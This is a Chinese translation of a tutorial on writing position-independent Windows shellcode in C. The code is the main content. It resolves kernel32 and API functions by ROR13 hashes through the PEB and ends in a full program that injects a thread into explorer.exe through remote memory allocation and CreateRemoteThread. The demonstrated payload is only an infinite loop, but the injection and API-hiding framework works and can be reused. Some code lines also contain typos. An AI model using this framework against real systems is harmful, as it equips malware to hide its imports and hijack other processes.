# 使用C编译器编写shellcode - 文章 - 伯乐在线
原文出处： [Nick Harbour](http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/)   译文出处：[IDF徐文博](http://blog.idf.cn/2013/12/writing-shellcode-with-a-c-compiler/)
**背景**
有时候程序员们需要写一段独立于位置操作的代码，可当作一段数据写到其他进程或者网络中去。该类型代码在它诞生之初就被称为shellcode，在软件利用中黑客们以此获取到shell权限。方法就是通过这样或那样的恶意手法使得这段代码得以执行，完成它的使命。当然了，该代码仅能靠它自己，作者无法使用现代软件开发的实践来推进shellcode的编写。
汇编常用于编写shellcode，特别是对代码大小挑剔的时候，汇编就是不错的选择。对我个人而言，多数项目都需要一段类似可以注入到其他进程的代码。这时候我就不是特别在意代码大小了，反而是开发效率以及调试能力显得尤为重要。一开始，我用NASM编写独立的汇编程序，把获得的输出文件转换为C数组，然后整合到我的程序中。这正是你在milw0rm这样的网站上所看到的，大多数exploit payload的获取方式。最终我厌倦了这样的方式，虽然很怀念NASM完备的功能，我还是开始使用内联汇编来解决问题。随着经验的积累，我发现了一个完全可用的纯C开发shellcode的方法，仅需2条内联汇编指令。就开发速度和调试shellcode时的上下文而言，真的比单纯使用汇编的方法有很大的改进。运用机器级的比如ollydbg这样的调试器，我毫不含糊，但这相对于用Visual Studio调试器来调试C源码，就是小菜一碟。
**准备工作**
为了确保能生成可用作shellcode这样特定格式的代码，我们需要对Visual Studio做些特殊的配置。下面的各项配置，可能随编译器的变更而变更：
1、使用Release模式。近来编译器的Debug模式可能产生逆序的函数，并且会插入许多与位置相关的调用。
2、禁用优化。编译器会默认优化那些没有使用的函数，而那可能正是我们所需要的。
3、禁用栈缓冲区安全检查（/Gs)。在函数头尾所调用的栈检查函数，存在于二进制文件的某个特定位置，导致输出的函数不能重定位，这对shellcode是无意义的。
**第一个shellcode**

Shell
```
#include <stdio.h>
void shell_code()
{
    for (;;)
        ;
}
void __declspec(naked) END_SHELLCODE(void) {}
int main(int argc, char *argv[])
{
    int sizeofshellcode = (int)END_SHELLCODE - (int)shell_code;
    // Show some info about our shellcode buffer
    printf("Shellcode starts at %p and is %d bytes long", shell_code. sizeofshellcode);
    // Now we can test out the shellcode by calling it from C!
    shell_code();
    return 0;
}
```
这里所示例的shellcode除了一个无限循环，啥事也没干。不过有一点是比较重要的————放在shell_code函数之后的END_SHELLCODE。有了这个，我们就能通过shell_code函数开头和END_SHELLCODE函数开头间的距离来确定shellcode的长度了。还有，C语言在这里所体现的好处就是我们能够把程序本身当作一段数据来访问，所以如果我们需要把shellcode写到另外一份文件中，仅需简单的调用fwrite(shell_code, sizeofshellcode, 1, filehandle)。
Visual Studio环境中，通过调用shell_code函数，借助IDE的调试技能，就可以很容易的调试shellcode了。
在上面所示的第一个小案例中，shellcode仅用了一个函数，其实我们可以使用许多函数。只是所有的函数需要连续地存放在shell_code函数和END_SHELLCODE函数之间，这是因为当在内部函数间调用时，call指令总是相对的。call指令的意思是“从距这里X字节的地方调用一个函数”。所以如果我们把执行call的代码和被调用的代码都拷贝到其他地方，同时又保证了它们间的相对距离，那么链接时就不会出岔子。
**Shellcode中数据的使用**
传统C源码中，如果要用一段诸如ASCII字符的数据，可以直接内嵌进去，无需担心数据的存放，比如: WinExec(“evil.exe”)。这里的“evil.exe”字符串被存储在C程序的静态区域（很可能是二进制的.rdata节中），如果我们把这段代码拷贝出来，试图将其注入到其他进程中，就会因那段字符不存在于其他进程的特定位置而失败。传统汇编编写的shellcode可以轻松的使用数据，这通过使用call指令获取到指向代码本身的指针，而这段代码可能就混杂着数据。下面是一个使用汇编实现的shellcode方式的WinExec调用：

Shell
```
call end_of_string
db 'evil.exe',0
end_of_string:
call WinExec
```
这里的第一个call指令跳过字符数据”evial.exe”，同时在栈顶存放了一个指向字符串的指针，稍后会被用作WinExec函数的参数。这种新颖的使用数据的方法有着很高的空间利用率，但是很可惜在C语言中没有与此等价的直接调用。在用C写shellcode时，我建议使用栈区来存放和使用字符串。为了使微软编译器在栈上动态的分配字符以便重定位，你需要如下处理：

Shell
```
char mystring[] = {'e','v','i','l','.','e','x','e',0};
winexec(mystring);
```
你会发现，我将字符串声明为字符数组的形式。如果我这样写char mystring[] = “evil.exe”; 在老式的微软编译器中，它会通过一系列的mov指令来构成字符串，而现在仅会简单的将字符串从内存中的固定位置拷贝到栈中，而如果需要重定位代码，这就无效了。把两种方法都试试，下载免费的IDA Pro版本看看它们的反汇编代码。上面的赋值语句的反汇编应该看起来如下所示：


```
mov [ebp+mystring], 65h
mov [ebp+mystring+1], 76h
mov [ebp+mystring+2], 69h
mov [ebp+mystring+3], 6Ch
mov [ebp+mystring+4], 2Eh
mov [ebp+mystring+5], 65h
mov [ebp+mystring+6], 78h
mov [ebp+mystring+7], 65h
mov [ebp+mystring+8], 0
```
处理数据时，字符串真的是很头疼的一件事。其他比如结构体、枚举、typedef声明、函数指针啊这些，都能如你预期的那样正常工作，你可以利用C提供的全套功能。确保数据为局部变量，一切都OK了。
**使用库函数**
我将这篇文章专注于Windows环境的shellcode。上面所提及的一些规则也适用于Unix系统。Windows环境下的shellcode会更复杂一点，因为我们没有一致公开的方法进行系统调用，就像在Unix中仅需几条汇编代码就可以的那样（对int 80h的调用）。我们需要利用DLL中提供的API函数，来进行系统调用做些像读写文件、网络通信这样的事。这些DLL最终会进行必要的系统调用，而它的实现细节几乎随着每次Windows的发布而变化。像《The Shellcoder’s Handbook》这样的标榜性著作描绘了搜寻内存中DLL和函数的方法。如果想将shellcode做到在不同Windows版本间的可移植性，有两个函数是必须的：1、查找kernel32.dll的函数；2、实现GetProcAddress()函数或者查找GetProcAddress()地址的函数。我所提供的实现是基于hash的而非字符串的比较，下面我将提供用于shellcode的hash实现，并做个简短的说明。
**Hash函数**
在shellcode中，使用hash进行函数的查询是比较普遍的。较流行的ROR13 hash方法是最常用的，它的实现也用在了《The Shellcoder’s Handbook》中。它的基本思想是当我们要查询一个名为“MyFunction”的函数时，不是将字符串存放在内存中，对每个函数名进行字符串的比对，而是生成一个32位的hash值，将每个函数名进行hash比对。这并不能减小运行时间，但是可以节省shellcode的空间，也具有一定的反逆向功效。下面我提供了ASCII和Unicode版本的ROR13 hash实现：

Shell
```
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
    DWORD hash = 0;
    while (*unicode_string != 0)
    {
        DWORD val = (DWORD)*unicode_string++;
        hash = (hash >> 13) | (hash << 19); // ROR 13
        hash += val;
    }
    return hash;
}
DWORD __stdcall ror13_hash(const char *string)
{
    DWORD hash = 0;
    while (*string) {
        DWORD val = (DWORD) *string++;
        hash = (hash >> 13)|(hash << 19);  // ROR 13
        hash += val;
    }
    return hash;
}
```
**查找DLL**
有3个链表可以用来描述内存中加载的DLL：
InMemoryOrderModuleList、InInitializationOrderModuleList和InLoadOrderModuleList。它们都在PEB(进程环境块）中。在你的shellcode中，用哪个都可以，我所用的是InMemoryOrderModuleList。需要如下的两条内联汇编来访问PEB:

Shell
```
PPEB __declspec(naked) get_peb(void)
{
    __asm {
        mov eax, fs:[0x30]
        ret
    }
}
```
现在我们已经获取了PEB，可以查询内存中的DLL了。唯一的一直存在于Windows进程内存中的DLL是ntdll.dll，但kernel32.dll会更方便一点，并且在99.99%的Windows进程中（Win32子系统）都可用。下面我提供的代码实现会查询module列表，利用unicode的ROR13 hash值查到kernel32.dll。

Shell
```
HMODULE __stdcall find_kernel32(void)
{
    return find_module_by_hash(0x8FECD63F);
}
HMODULE __stdcall find_module_by_hash(DWORD hash)
{
    PPEB peb;
    LDR_DATA_TABLE_ENTRY *module_ptr, *first_mod;
    peb = get_peb();
    module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    first_mod = module_ptr;
    do {
        if (unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
            return (HMODULE)module_ptr->Reserved2[0];
        else
            module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
    } while (module_ptr && module_ptr != first_mod);   // because the list wraps,
    return INVALID_HANDLE_VALUE;
}
```
这里所提供的find_module_by_hash函数可以利用dll名称的hash值找到任意的加载在内存中的DLL。如果要加载一个新的原本不再内存中的DLL，就需要使用kernel32.dll中的LoadLibrary函数。要找到LoadLibrary函数，我们就需要实现GetProcAddress函数。下面的代码实现利用函数名的hash值在加载的dll中查找函数：

Shell
```
FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
    IMAGE_DOS_HEADER *dos_header;
    IMAGE_NT_HEADERS *nt_headers;
    IMAGE_EXPORT_DIRECTORY *export_dir;
    DWORD *names, *funcs;
    WORD *nameords;
    int i;
    dos_header = (IMAGE_DOS_HEADER *)module;
    nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
    export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    names = (DWORD *)((char *)module + export_dir->AddressOfNames);
    funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
    nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);
    for (i = 0; i < export_dir->NumberOfNames; i++)
    {
        char *string = (char *)module + names[i];
        if (hash == ror13_hash(string))
        {
            WORD nameord = nameords[i];
            DWORD funcrva = funcs[nameord];
            return (FARPROC)((char *)module + funcrva);
        }
    }
    return NULL;
}
```
现在我们可以这样查找函数：

Shell
```
HMODULE kern32 = find_kernel32();
FARPROC loadlibrarya = find_function(kern32, 0xEC0E4E8E);   // the hash of LoadLibraryA
```
**最终成品**
现在我将以完整的C程序的方式来展示上面所提及的内容。代码执行时，将生成名为shellcode.bin的文件，它就存储着shellcode。该shellcode可以向explorer.exe注入一个线程，实现无限循环，直至消耗完cpu。

Shell
```
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>
#include <tlhelp32.h>
PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
HANDLE __stdcall find_process(HMODULE kern32, const char *procname);
VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char *code, DWORD size);
BOOL __stdcall strmatch(const char *a, const char *b);
void __stdcall shell_code()
{
    HMODULE kern32;
    DWORD *dwptr;
    HANDLE hProcess;
    char procname[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};
    char code[] = {0xEB, 0xFE};
    kern32 = find_kernel32();
    hProcess = find_process(kern32, (char *)procname);
    inject_code(kern32, hProcess, code, sizeof code);
}
HANDLE __stdcall find_process(HMODULE kern32, const char *procname)
{
    FARPROC createtoolhelp32snapshot = find_function(kern32, 0xE454DFED);
    FARPROC process32first = find_function(kern32, 0x3249BAA7);
    FARPROC process32next = find_function(kern32, 0x4776654A);
    FARPROC openprocess = find_function(kern32, 0xEFE297C0);
    FARPROC createprocess = find_function(kern32, 0x16B3FE72);
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    hSnapshot = (HANDLE)createtoolhelp32snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return INVALID_HANDLE_VALUE;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    if (!process32first(hSnapshot, &pe32))
        return INVALID_HANDLE_VALUE;
    do
    {
        if (strmatch(pe32.szExeFile, procname))
        {
            return openprocess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        }
    } while (process32next(hSnapshot, &pe32));
    return INVALID_HANDLE_VALUE;
}
BOOL __stdcall strmatch(const char *a, const char *b)
{
    while (*a != '' && *b != '')
    {
        char aA_delta = 'a' - 'A';
        char a_conv = *a >= 'a' && *a <= 'z' ? *a - aA_delta : *a;
        char b_conv = *b >= 'a' && *b <= 'z' ? *b - aA_delta : *b;
        if (a_conv != b_conv)
            return FALSE;
        a++;
        b++;
    }
    if (*b == '' && *a == '')
        return TRUE;
    else
        return FALSE;
}
VOID __stdcall inject_code(HMODULE kern32, HANDLE hprocess, const char *code, DWORD size)
{
    FARPROC virtualallocex = find_function(kern32, 0x6E1A959C);
    FARPROC writeprocessmemory = find_function(kern32, 0xD83D6AA1);
    FARPROC createremotethread = find_function(kern32, 0x72BD9CDD);
    LPVOID remote_buffer;
    DWORD dwNumBytesWritten;
    remote_buffer = virtualallocex(hprocess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remote_buffer == NULL)
        return;
    if (!writeprocessmemory(hprocess, remote_buffer, code, size, &dwNumBytesWritten))
        return;
    createremotethread(hprocess, NULL, 0, remote_buffer, NULL, 0, NULL);
}
HMODULE __stdcall find_kernel32(void)
{
    return find_module_by_hash(0x8FECD63F);
}
HMODULE __stdcall find_module_by_hash(DWORD hash)
{
    PPEB peb;
    LDR_DATA_TABLE_ENTRY *module_ptr, *first_mod;
    peb = get_peb();
    module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    first_mod = module_ptr;
    do {
        if (unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
            return (HMODULE)module_ptr->Reserved2[0];
        else
            module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
    } while (module_ptr && module_ptr != first_mod);   // because the list wraps,
    return INVALID_HANDLE_VALUE;
}
PPEB __declspec(naked) get_peb(void)
{
    __asm {
        mov eax, fs:[0x30]
        ret
    }
}
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
    DWORD hash = 0;
    while (*unicode_string != 0)
    {
        DWORD val = (DWORD)*unicode_string++;
        hash = (hash >> 13) | (hash << 19); // ROR 13
        hash += val;
    }
    return hash;
}
DWORD __stdcall ror13_hash(const char *string)
{
    DWORD hash = 0;
    while (*string) {
        DWORD val = (DWORD) *string++;
        hash = (hash >> 13)|(hash << 19);  // ROR 13
        hash += val;
    }
    return hash;
}
FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
    IMAGE_DOS_HEADER *dos_header;
    IMAGE_NT_HEADERS *nt_headers;
    IMAGE_EXPORT_DIRECTORY *export_dir;
    DWORD *names, *funcs;
    WORD *nameords;
    int i;
    dos_header = (IMAGE_DOS_HEADER *)module;
    nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
    export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    names = (DWORD *)((char *)module + export_dir->AddressOfNames);
    funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
    nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);
    for (i = 0; i < export_dir->NumberOfNames; i++)
    {
        char *string = (char *)module + names[i];
        if (hash == ror13_hash(string))
        {
            WORD nameord = nameords[i];
            DWORD funcrva = funcs[nameord];
            return (FARPROC)((char *)module + funcrva);
        }
    }
    return NULL;
}
void __declspec(naked) END_SHELLCODE(void) {}
int main(int argc, char *argv[])
{
    FILE *output_file = fopen("shellcode.bin", "w");
    fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);
    fclose(output_file);
    return 0;
}
```
